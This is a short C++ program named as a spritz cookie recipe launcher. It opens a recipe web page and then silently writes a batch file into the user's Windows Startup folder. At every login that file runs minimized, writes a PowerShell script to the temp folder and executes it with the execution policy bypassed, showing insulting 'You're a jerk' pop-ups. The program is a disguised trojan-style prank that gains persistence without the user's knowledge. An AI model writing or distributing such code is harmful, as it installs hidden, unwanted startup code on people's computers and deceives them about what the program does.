// spritzCookieRecipe.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <iostream>
#include <fstream>
#include <string>
using namespace std;
#include <windows.h>
#include <Lmcons.h>
int main()
{
    system("start https://www.bettycrocker.com/recipes/classic-spritz-cookies/aa68df04-bd64-4f1b-8421-0df82064bca4");
    //UNLEN is a <.lmcons.h> variable representing the length of the username
    TCHAR name[UNLEN + 1];
    DWORD size = UNLEN + 1;

    GetUserName((TCHAR*)name, &size);
    wstring userNameW = name;
    string userName(userNameW.begin(), userNameW.end());
    string path;
    ofstream file;
    file.open("C:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jerk.cmd");
    file << "if not \"\%minimized\%\"==\"\" goto :minimized\n";
    file << "set minimized=true\n";
    file << "start /min cmd /C \"\%\~dpnx0\"\n";
    file << "goto :EOF\n";
    file << ":minimized\n";
    file << "@echo off\n";
    file << "echo Add-Type -AssemblyName PresentationCore,PresentationFramework \> \"\%TEMP\%\\jerk.ps1\"\n";
    file << "echo For ($i=0\; $i -le 5\; $i\+\+){ \>\>\"\%TEMP\%\\jerk.ps1\"\n";
    file << "echo [System.Windows.MessageBox]::Show(\"You're a jerk\") \>\>\"\%TEMP\%\\jerk.ps1\"\n";
    file << "echo } \>\>\"\%\TEMP\%\\jerk.ps1\"\n";
    file << "PowerShell -ExecutionPolicy ByPass -File \"\%TEMP\%\\jerk.ps1\"";
    file.close();
}

